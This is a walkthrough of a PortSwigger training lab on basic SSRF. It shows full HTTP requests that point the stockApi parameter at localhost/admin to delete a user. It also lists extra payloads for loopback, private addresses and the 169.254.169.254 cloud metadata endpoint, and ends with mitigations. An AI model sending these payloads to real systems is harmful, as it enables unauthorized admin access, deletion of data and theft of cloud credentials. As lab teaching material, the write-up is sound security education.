# 📘 PortSwigger Lab: Basic SSRF against the local server

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost  
> 🎯 Topic: Server-Side Request Forgery (SSRF) — attack against the server itself  
> 🧪 Difficulty: Apprentice  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🔗 What Is SSRF](#ssrf)
- [🤝 Trust Relationships](#trust)
- [🏠 Why `localhost` Is Special](#localhost)
- [🛒 How the Stock Check Feature Works](#stock-check)
- [❌ Vulnerable Logic](#vulnerable-flow)
- [🔍 Step 1 — Confirm `/admin` Is Not Directly Accessible](#step1)
- [🔍 Step 2 — Intercept the Stock Check Request](#step2)
- [🔍 Step 3 — Send the Request to Repeater](#step3)
- [🔍 Step 4 — Replace `stockApi` with `http://localhost/admin`](#step4)
- [🔍 Step 5 — Find the User Deletion URL](#step5)
- [🔍 Step 6 — Delete User `carlos`](#step6)
- [📨 Example Original Request](#original-request)
- [📨 Example Modified Request](#modified-request)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

The lab has a stock check feature that fetches data from an internal system.

Requirements:

```text
1. Exploit the SSRF vulnerability in the stockApi parameter.
2. Access the admin interface at:

   http://localhost/admin

3. Delete the user carlos.
```

---

<a id="theory"></a>

## 🧠 Short Theory

**SSRF (Server-Side Request Forgery)** is a vulnerability that allows an attacker to make the **server** send an HTTP request to a URL controlled by the attacker.

In this lab, the parameter:

```text
stockApi
```

accepts a **full URL** of an internal API that the server requests on its own behalf. The attacker replaces the URL with:

```text
http://localhost/admin
```

The server fetches its own admin panel "from the inside", and the access control that blocks external users lets the request through — because it looks like a request from a trusted local machine.

---

<a id="idea"></a>

## 🧩 Core Idea

The vulnerability relies on two facts:

```text
1. The server trusts the user to choose the URL for an internal request.
2. The admin interface trusts requests coming from localhost.
```

The chain:

```text
Attacker ──(stockApi=http://localhost/admin)──> Server
                                                    │
                                                    ▼
                                    Server ──(GET /admin)──> localhost
                                                    │
                                                    ▼
                                Admin response returned to the attacker
```

---

<a id="ssrf"></a>

## 🔗 What Is SSRF

SSRF occurs when an application, at the attacker's will, makes requests to **unintended locations**.

Typical scenarios:

- requests to the **server itself** via loopback (`localhost`, `127.0.0.1`);
- requests to **internal backends** in private networks (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`);
- requests to **cloud metadata** (`http://169.254.169.254/latest/meta-data/`);
- requests to **external** systems on behalf of the organization.

The cause is always the same: **the application trusts user input as a resource address** and does not verify where the request actually goes.

---

<a id="trust"></a>

## 🤝 Trust Relationships

SSRF exploits **layers of trust** in the architecture:

- the application trusts the user and places their URL into its own request;
- internal services trust requests coming from the application;
- the admin panel trusts requests from localhost.

The attacker uses the server as a **proxy** that passes through protection layers unreachable directly:

```text
Attacker ──✗──> /admin (blocked by access control)

Attacker ──(SSRF)──> Application ──(request on its own behalf)──> /admin ✅
```

---

<a id="localhost"></a>

## 🏠 Why `localhost` Is Special

`localhost` / `127.0.0.1` is the **loopback interface** of the machine itself.

A request to `http://localhost/admin` never leaves the server: the application calls itself.

Why the admin panel listens locally:

- access control is implemented in an **external component** (reverse proxy/WAF), and a loopback request bypasses it;
- for **disaster recovery**, an admin may log in without a password only from the local machine;
- the admin interface listens on a **different port/interface** not reachable externally.

Result: an "internal" request bypasses checks designed for external users.

---

<a id="stock-check"></a>

## 🛒 How the Stock Check Feature Works

The shop shows whether an item is in stock. To do this, the frontend passes the URL of an internal API to the server:

```text
POST /product/stock
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

The server requests this URL, receives the response, and returns it to the user.

The parameter:

```text
stockApi
```

is the entry point for SSRF: the user controls the **entire URL** of the request.

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Logic

Simplified:

```python
stock_api = request.form["stockApi"]
response = http_client.get(stock_api)   # no URL validation
return response.body
```

Problems:

```text
1. The URL comes from user input without validation.
2. No restriction on the scheme (http/https).
3. No blocking of loopback/private addresses.
4. The internal response is returned to the user.
```

---

<a id="step1"></a>

## 🔍 Step 1 — Confirm `/admin` Is Not Directly Accessible

Open in the browser:

```text
https://LAB-ID.web-security-academy.net/admin
```

Expected result:

```text
Access denied
```

or a redirect — direct access to the admin panel is blocked.

Conclusion: admin functionality exists but is protected by access control for external requests.

The pentester's question:

```text
What happens if the request comes not from the user's browser,
but from the server itself?
```

---

<a id="step2"></a>

## 🔍 Step 2 — Intercept the Stock Check Request

1. Open any product page.
2. Start Burp Suite and enable interception (Intercept on).
3. Click the:

```text
Check stock
```

button.

4. Burp Proxy captures the request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

The main test input:

```text
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

---

<a id="step3"></a>

## 🔍 Step 3 — Send the Request to Repeater

In Burp Proxy, right-click and select:

```text
Send to Repeater
```

Open the:

```text
Repeater
```

tab.

Repeater allows you to:

- modify the `stockApi` value;
- resend the request multiple times;
- analyze the status and body of the response.

---

<a id="step4"></a>

## 🔍 Step 4 — Replace `stockApi` with `http://localhost/admin`

Replace the parameter value:

```text
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

with:

```text
stockApi=http://localhost/admin
```

Request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

stockApi=http://localhost/admin
```

Click:

```text
Send
```

The response contains the **admin interface**: the server fetched `http://localhost/admin` on its own behalf and returned the HTML to the user.

---

<a id="step5"></a>

## 🔍 Step 5 — Find the User Deletion URL

Read the HTML in the response body and find the user deletion link/form.

The admin panel has a delete function:

```text
http://localhost/admin/delete?username=carlos
```

This is the target URL for the final request.

---

<a id="step6"></a>

## 🔍 Step 6 — Delete User `carlos`

Replace `stockApi` with the deletion URL:

```text
stockApi=http://localhost/admin/delete?username=carlos
```

Request:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=http://localhost/admin/delete?username=carlos
```

After a successful send:

```text
✅ Lab solved
```

User `carlos` has been deleted via SSRF.

---

<a id="original-request"></a>

## 📨 Example Original Request

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

The client controls `stockApi` — the full URL of the internal API.

---

<a id="modified-request"></a>

## 📨 Example Modified Request

### Request 1 — access the admin panel

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

stockApi=http://localhost/admin
```

### Request 2 — delete the user

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=http://localhost/admin/delete?username=carlos
```

---

<a id="response"></a>

## 📥 Example Result

### Response to Request 1

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...

<!DOCTYPE html>
<html>
...
<h1>Users</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
...
```

Important: the HTML contains a user deletion link — the final URL is taken from it.

### Response to Request 2

```http
HTTP/1.1 200 OK
...
```

and the lab status changes to:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the lab
2. Check /admin directly — access denied
3. Open a product page
4. Enable interception in Burp Proxy
5. Click "Check stock" and intercept POST /product/stock
6. Send the request to Repeater
7. Replace stockApi with http://localhost/admin
8. Send — admin interface in the response body
9. Find the deletion URL: /admin/delete?username=carlos
10. Replace stockApi with http://localhost/admin/delete?username=carlos
11. Send — user carlos deleted
12. Lab marked as Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. The User Controls the Full URL

The `stockApi` parameter accepts an arbitrary URL without validation.

### 2. The Request Is Executed by the Server, Not the Browser

The server reaches `http://localhost/admin` **from its own network position**.

### 3. Trust in the Loopback Address

The admin panel does not check authorization for requests coming from localhost — it considers them trusted.

### 4. Access Control Sits "Outside"

An external component blocks the user but cannot block a request the application makes to itself.

### 5. The Response Is Returned to the Attacker

The SSRF is not blind: the admin panel content arrives in the HTTP response, making exploitation trivial.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When you see a parameter with a URL or part of it, ask:

```text
Who executes the request — the browser or the server?
```

```text
Do I control the whole URL or only part of it?
```

```text
Is the internal response returned to me?
```

```text
Are there internal services worth probing with localhost,
127.0.0.1, 169.254.169.254, or private addresses?
```

SSRF indicators:

```text
stockApi   url    path   dest   redirect   uri
load       src    link   next   image_url  callback
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following can be compared:

### Direct access (blocked)

```text
GET /admin
```

### SSRF to localhost (works)

```text
stockApi=http://localhost/admin
```

### SSRF via loopback IP

```text
stockApi=http://127.0.0.1/admin
```

### SSRF to an internal address

```text
stockApi=http://192.168.0.68/admin
```

### SSRF to cloud metadata (in real systems)

```text
stockApi=http://169.254.169.254/latest/meta-data/
```

Working solution for this lab:

```text
stockApi=http://localhost/admin/delete?username=carlos
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Trying to Open `/admin` Directly

Direct access is blocked — the request must come "on behalf of the server".

### Mistake 2. Modifying the Wrong Parameter

Modify `stockApi`, not `productId` or `storeId`.

### Mistake 3. Deleting a User Without Accessing the Admin Panel First

First obtain the admin interface, read the HTML, and find the correct deletion URL.

### Mistake 4. Using `https://localhost/admin`

The server listens on HTTP — the scheme must match.

### Mistake 5. Not Intercepting the Request

The `POST /product/stock` request is only sent when clicking "Check stock" — it must be intercepted in Burp Proxy.

### Mistake 6. Looking Only at the Status Code

Success is determined by the response body (the admin HTML), not just `200 OK`.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Accept URLs from the User

Use a server-side allowlist of internal endpoints:

```python
allowed_apis = {
    "stock": "http://internal-stock-api:8080/check",
}
api = allowed_apis[user_input]
```

### 2. Validate the URL

Check:

```text
- scheme is http/https only
- no credentials in the URL
- hostname is not in private ranges
```

### 3. Block Private Addresses

```text
127.0.0.0/8        loopback
10.0.0.0/8         private
172.16.0.0/12      private
192.168.0.0/16     private
169.254.169.254    cloud metadata
```

### 4. Defend Against DNS Rebinding

Resolve the hostname, validate the IP, then perform the request against that exact IP.

### 5. Authenticate Internal Services

The admin panel and backends must not trust requests just because they come "from inside".

### 6. Network Segmentation

Restrict where the application can connect (network policy / egress filtering).

### 7. Log Outgoing Requests

Record the URLs the server fetches — this helps detect abuse.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Checked direct access to `/admin` — blocked
- [ ] Opened a product page
- [ ] Intercepted the `POST /product/stock` request
- [ ] Found the `stockApi` parameter
- [ ] Sent the request to Repeater

### Exploitation

- [ ] `stockApi` replaced with `http://localhost/admin`
- [ ] Admin interface received in the response
- [ ] Deletion URL found: `/admin/delete?username=carlos`
- [ ] `stockApi` replaced with `http://localhost/admin/delete?username=carlos`
- [ ] User `carlos` deleted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved through the classic SSRF scenario "against the server itself":

```text
stockApi=http://localhost/admin
```

The server executed a request to its own admin panel on its own behalf, bypassing the access control designed for external users. Then, via:

```text
stockApi=http://localhost/admin/delete?username=carlos
```

user `carlos` was deleted.

Main lessons:

```text
SSRF is an abuse of trust: the application trusts input,
internal services trust the source of the request.
```

```text
Loopback and private addresses must be blocked server-side.
```

```text
Internal interfaces must require authentication regardless of the request source.
```

```text
User input must not control outbound URLs without strict validation.
```

---

[⬆ Back to top](#top)
